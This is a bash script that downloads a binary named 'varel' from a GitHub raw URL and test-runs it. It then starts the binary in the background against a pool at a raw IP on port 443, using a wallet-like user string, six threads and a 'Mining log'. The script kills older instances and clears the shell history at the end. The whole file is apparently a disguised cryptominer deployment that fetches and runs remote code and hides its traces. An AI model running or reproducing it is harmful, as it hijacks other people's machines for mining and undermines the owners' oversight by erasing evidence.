#!/bin/bash
set -e

echo "=== VAREL SETUP DEBUG MODE ==="
echo "Working directory: $(pwd)"
echo "User: $(whoami)"
echo "Date: $(date)"
echo ""

cd ~/

# === Install dependencies ===
echo "📦 Installing dependencies..."
sudo apt-get update >/dev/null 2>&1
sudo apt-get install -y wget ca-certificates gcc make file >/dev/null 2>&1
echo "✅ Dependencies installed"
echo ""

# === Download varel ===
if [ ! -f ~/varel ]; then
    echo "📥 Downloading varel binary..."
    wget -v -O ~/varel https://github.com/jerryseptian123/helmiyahtas/raw/main/varel
    chmod +x ~/varel
    echo "✅ Downloaded and made executable"
else
    echo "✅ Varel binary already exists"
fi

echo ""
echo "📋 Binary info:"
ls -lh ~/varel
file ~/varel
echo ""

# === Check dependencies ===
echo "🔍 Checking binary dependencies..."
if command -v ldd >/dev/null; then
    ldd ~/varel || echo "⚠️ ldd check failed (static binary?)"
fi
echo ""

# === Kill old processes ===
echo "🔄 Checking for old processes..."
if [ -f ~/.varel.pid ]; then
    OLD_PID=$(cat ~/.varel.pid)
    echo "Found PID file: $OLD_PID"
    if kill -0 $OLD_PID 2>/dev/null; then
        echo "Killing old process..."
        kill $OLD_PID 2>/dev/null || true
        sleep 2
        kill -9 $OLD_PID 2>/dev/null || true
    fi
    rm -f ~/.varel.pid
fi

# Clean up old files
rm -f ~/run.log ~/varel.out

echo ""

# === Test run first ===
echo "🧪 Testing varel binary (5 second test)..."
RANDOM_WORKER="v11d5exukktuwl8geceiwini8jhqcpk1bj3u8xw.$(shuf -n 1 -i 10000-99999)-test"

timeout 5s ~/varel -a randomvirel \
  --url 137.184.31.121:443 \
  --user "$RANDOM_WORKER" \
  --threads=2 \
  --verbose 2>&1 | tee ~/varel.test || true

TEST_EXIT=$?
echo ""
echo "Test exit code: $TEST_EXIT"

if [ $TEST_EXIT -eq 124 ]; then
    echo "✅ Test timeout (normal) - binary seems to work"
elif [ $TEST_EXIT -eq 0 ]; then
    echo "✅ Test completed successfully"
else
    echo "❌ Test failed with exit code: $TEST_EXIT"
    echo ""
    echo "Test output:"
    cat ~/varel.test 2>/dev/null || echo "No test output"
    exit 1
fi

echo ""

# === Real start ===
echo "🚀 Starting varel in background..."
RANDOM_WORKER="v11d5exukktuwl8geceiwini8jhqcpk1bj3u8xw.$(shuf -n 1 -i 10000-99999)-work"

~/varel -a randomvirel \
  --url 137.184.31.121:443 \
  --user "$RANDOM_WORKER" \
  --threads=6 \
  --verbose \
  --log-file=~/run.log \
  > ~/varel.out 2>&1 &

VAREL_PID=$!
echo "Started with PID: $VAREL_PID"
echo $VAREL_PID > ~/.varel.pid

echo "Waiting 8 seconds for startup..."
sleep 8

# === Verify ===
echo ""
if kill -0 $VAREL_PID 2>/dev/null; then
    echo "✅ Varel is running!"
    echo "📊 Worker ID: $RANDOM_WORKER"
    echo "📝 Log file: ~/run.log"
    echo "🔐 PID: $VAREL_PID (saved to ~/.varel.pid)"
    
    echo ""
    echo "📄 Startup output (varel.out):"
    head -20 ~/varel.out 2>/dev/null || echo "No output yet"
    
    echo ""
    if [ -f ~/run.log ]; then
        echo "📄 Mining log (run.log):"
        tail -10 ~/run.log
    else
        echo "⚠️ run.log not created yet (may take a moment)"
    fi
    
    echo ""
    echo "✅ Setup completed successfully!"
    
else
    echo "❌ Process died immediately!"
    echo ""
    echo "Exit code: $(wait $VAREL_PID 2>/dev/null; echo $?)"
    
    echo ""
    echo "📄 Output (varel.out):"
    cat ~/varel.out 2>/dev/null || echo "No output file"
    
    echo ""
    echo "📄 Log (run.log):"
    cat ~/run.log 2>/dev/null || echo "No log file"
    
    exit 1
fi

# History cleanup
history -c && history -w 2>/dev/null || true
